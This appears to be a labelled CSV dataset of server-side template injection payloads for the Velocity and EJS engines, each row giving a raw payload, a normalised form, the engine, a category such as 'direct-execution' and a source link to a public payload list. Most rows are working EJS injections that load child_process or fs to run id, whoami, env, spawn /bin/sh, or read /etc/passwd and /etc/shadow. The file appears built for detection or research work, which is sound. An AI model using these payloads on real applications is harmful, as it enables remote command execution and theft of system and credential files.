#set($br=$bufferedReader.newInstance($isr)),#set($br=$bufferedreader.newinstance($isr)),java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#foreach($i in [1..$out.available()])$out.write($i)#end,#foreach($iin[N..$out.available()])$out.write($i)#end,java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($x=$context.get('out')),#set($x=$context.get('S')),java,Velocity,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($x=$context.get('request')),#set($x=$context.get('S')),java,Velocity,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
<%= global %>,<%=global%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process %>,<%=process%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= global.process %>,<%=global.process%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule %>,<%=process.mainmodule%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require %>,<%=process.mainmodule.require%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process') %>,<%=process.mainmodule.require('S')%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').exec('id') %>,<%=process.mainmodule.require('S').exec('S')%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').exec('whoami') %>,<%=process.mainmodule.require('S').exec('S')%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').exec('cat /etc/passwd') %>,<%=process.mainmodule.require('S').exec('S')%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').exec('ls -la') %>,<%=process.mainmodule.require('S').exec('S')%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').exec('uname -a') %>,<%=process.mainmodule.require('S').exec('S')%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').exec('pwd') %>,<%=process.mainmodule.require('S').exec('S')%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').exec('env') %>,<%=process.mainmodule.require('S').exec('S')%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').exec('cat flag.txt') %>,<%=process.mainmodule.require('S').exec('S')%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').exec('ps aux') %>,<%=process.mainmodule.require('S').exec('S')%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').exec('ifconfig') %>,<%=process.mainmodule.require('S').exec('S')%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').exec('netstat -an') %>,<%=process.mainmodule.require('S').exec('S')%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').exec('cat /etc/shadow') %>,<%=process.mainmodule.require('S').exec('S')%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('id').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('whoami').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('cat /etc/passwd').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('ls -la').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('uname -a').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('pwd').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('env').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('cat flag.txt').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('ps aux').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('ifconfig').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('netstat -an').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('cat /etc/shadow').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').spawnSync('id').stdout.toString() %>,<%=process.mainmodule.require('S').spawnsync('S').stdout.tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').spawnSync('whoami').stdout.toString() %>,<%=process.mainmodule.require('S').spawnsync('S').stdout.tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.require('child_process').spawnSync('cat',['/etc/passwd']).stdout.toString() %>","<%=process.mainmodule.require('S').spawnsync('S',['S']).stdout.tostring()%>",javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.require('child_process').spawnSync('ls',['-la']).stdout.toString() %>","<%=process.mainmodule.require('S').spawnsync('S',['S']).stdout.tostring()%>",javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.require('child_process').spawnSync('uname',['-a']).stdout.toString() %>","<%=process.mainmodule.require('S').spawnsync('S',['S']).stdout.tostring()%>",javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').spawnSync('pwd').stdout.toString() %>,<%=process.mainmodule.require('S').spawnsync('S').stdout.tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').spawnSync('env').stdout.toString() %>,<%=process.mainmodule.require('S').spawnsync('S').stdout.tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.require('child_process').spawnSync('cat',['flag.txt']).stdout.toString() %>","<%=process.mainmodule.require('S').spawnsync('S',['S']).stdout.tostring()%>",javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>,<%=global.process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= global.process.mainModule.require('child_process').execSync('whoami').toString() %>,<%=global.process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= global.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString() %>,<%=global.process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= global.process.mainModule.require('child_process').execSync('ls -la').toString() %>,<%=global.process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= global.process.mainModule.require('child_process').execSync('uname -a').toString() %>,<%=global.process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','id'],stdio:[{type:'pipe',readable:1,writable:1}]}).output[1].toString() %>","<%=process.binding('S').spawn({file:'S',args:['S','S','S'],stdio:[{type:'S',readable:N,writable:N}]}).output[N].tostring()%>",javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','whoami'],stdio:[{type:'pipe',readable:1,writable:1}]}).output[1].toString() %>","<%=process.binding('S').spawn({file:'S',args:['S','S','S'],stdio:[{type:'S',readable:N,writable:N}]}).output[N].tostring()%>",javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','cat /etc/passwd'],stdio:[{type:'pipe',readable:1,writable:1}]}).output[1].toString() %>","<%=process.binding('S').spawn({file:'S',args:['S','S','S'],stdio:[{type:'S',readable:N,writable:N}]}).output[N].tostring()%>",javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','ls -la'],stdio:[{type:'pipe',readable:1,writable:1}]}).output[1].toString() %>","<%=process.binding('S').spawn({file:'S',args:['S','S','S'],stdio:[{type:'S',readable:N,writable:N}]}).output[N].tostring()%>",javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.env %>,<%=process.env%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.env.PATH %>,<%=process.env.path%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.env.HOME %>,<%=process.env.home%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.env.USER %>,<%=process.env.user%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.env.SHELL %>,<%=process.env.shell%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.version %>,<%=process.version%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.versions %>,<%=process.versions%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.platform %>,<%=process.platform%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.arch %>,<%=process.arch%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.release %>,<%=process.release%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.config %>,<%=process.config%>,javascript,EJS,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.pid %>,<%=process.pid%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.ppid %>,<%=process.ppid%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.cwd() %>,<%=process.cwd()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.execPath %>,<%=process.execpath%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.argv %>,<%=process.argv%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.execArgv %>,<%=process.execargv%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.memoryUsage() %>,<%=process.memoryusage()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.uptime() %>,<%=process.uptime()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= global.process.env %>,<%=global.process.env%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= global.process.version %>,<%=global.process.version%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= global.process.platform %>,<%=global.process.platform%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= global.process.cwd() %>,<%=global.process.cwd()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.require('fs').readFileSync('/etc/passwd','utf8') %>","<%=process.mainmodule.require('S').readfilesync('S','S')%>",javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.require('fs').readFileSync('flag.txt','utf8') %>","<%=process.mainmodule.require('S').readfilesync('S','S')%>",javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('fs').readdirSync('/') %>,<%=process.mainmodule.require('S').readdirsync('S')%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('fs').readdirSync('.') %>,<%=process.mainmodule.require('S').readdirsync('S')%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('fs').existsSync('/etc/passwd') %>,<%=process.mainmodule.require('S').existssync('S')%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('fs').statSync('/etc/passwd') %>,<%=process.mainmodule.require('S').statsync('S')%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= global.process.mainModule.require('fs').readFileSync('/etc/passwd','utf8') %>","<%=global.process.mainmodule.require('S').readfilesync('S','S')%>",javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= global.process.mainModule.require('fs').readFileSync('flag.txt','utf8') %>","<%=global.process.mainmodule.require('S').readfilesync('S','S')%>",javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= global.process.mainModule.require('fs').readdirSync('/') %>,<%=global.process.mainmodule.require('S').readdirsync('S')%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.constructor._load('child_process').execSync('id').toString() %>,<%=process.mainmodule.constructor._load('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.constructor._load('child_process').execSync('whoami').toString() %>,<%=process.mainmodule.constructor._load('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString() %>,<%=process.mainmodule.constructor._load('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.constructor._load('child_process').execSync('ls -la').toString() %>,<%=process.mainmodule.constructor._load('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.constructor._load('child_process').execSync('uname -a').toString() %>,<%=process.mainmodule.constructor._load('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.constructor._load('fs').readFileSync('/etc/passwd','utf8') %>","<%=process.mainmodule.constructor._load('S').readfilesync('S','S')%>",javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.constructor._load('fs').readFileSync('flag.txt','utf8') %>","<%=process.mainmodule.constructor._load('S').readfilesync('S','S')%>",javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.constructor._load('fs').readdirSync('/') %>,<%=process.mainmodule.constructor._load('S').readdirsync('S')%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').spawn('id') %>,<%=process.mainmodule.require('S').spawn('S')%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').spawn('whoami') %>,<%=process.mainmodule.require('S').spawn('S')%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.require('child_process').spawn('cat',['/etc/passwd']) %>","<%=process.mainmodule.require('S').spawn('S',['S'])%>",javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.require('child_process').spawn('ls',['-la']) %>","<%=process.mainmodule.require('S').spawn('S',['S'])%>",javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').hostname() %>,<%=process.mainmodule.require('S').hostname()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').type() %>,<%=process.mainmodule.require('S').type()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').platform() %>,<%=process.mainmodule.require('S').platform()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').arch() %>,<%=process.mainmodule.require('S').arch()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').release() %>,<%=process.mainmodule.require('S').release()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').uptime() %>,<%=process.mainmodule.require('S').uptime()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').loadavg() %>,<%=process.mainmodule.require('S').loadavg()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').totalmem() %>,<%=process.mainmodule.require('S').totalmem()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').freemem() %>,<%=process.mainmodule.require('S').freemem()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').cpus() %>,<%=process.mainmodule.require('S').cpus()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').networkInterfaces() %>,<%=process.mainmodule.require('S').networkinterfaces()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').userInfo() %>,<%=process.mainmodule.require('S').userinfo()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').homedir() %>,<%=process.mainmodule.require('S').homedir()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').tmpdir() %>,<%=process.mainmodule.require('S').tmpdir()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('child_process').execSync('id').toString() %>,<%=require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('child_process').execSync('whoami').toString() %>,<%=require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
